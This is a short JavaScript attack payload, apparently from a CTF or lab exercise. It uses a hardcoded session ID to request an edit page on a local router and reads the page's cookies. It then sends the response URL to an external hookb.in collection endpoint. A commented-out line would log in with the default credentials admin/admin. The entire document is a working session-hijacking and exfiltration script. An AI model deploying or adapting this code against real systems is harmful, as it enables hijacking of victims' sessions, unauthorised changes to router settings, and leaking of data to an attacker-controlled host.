const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
http.open('GET', 'http://router.local/home.php?action=edit&PHPSESSID=b52lif60gjv6t49nrafl08qse5', true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/aB0eXaLPk9sXQ9kkEBaR', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseURL));

};
const cook = document.cookie;
http.send();
//http.send(cook+"&username=admin&pin=admin&notRobot=on");

   

